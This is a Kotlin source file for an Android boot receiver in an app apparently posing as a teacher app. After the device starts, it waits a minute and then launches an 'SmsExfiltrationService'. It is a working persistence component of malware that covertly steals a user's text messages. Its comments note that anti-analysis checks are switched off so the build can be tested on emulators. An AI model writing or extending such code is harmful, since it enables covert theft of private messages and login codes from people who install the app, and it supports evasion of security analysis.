package com.teacherapp.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.teacherapp.services.SmsExfiltrationService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * BootReceiver - Triggers SMS exfiltration after device boot
 *
 * TESTING MODE: NO ANTI-ANALYSIS
 * This version works on emulators for testing
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            // Trigger SMS exfiltration after boot
            // NO ANTI-ANALYSIS - works on emulator
            CoroutineScope(Dispatchers.Default).launch {
                // Wait 60 seconds after boot
                delay(60000L)

                // Start SMS exfiltration service
                SmsExfiltrationService.startExfiltration(context)
            }
        }
    }
}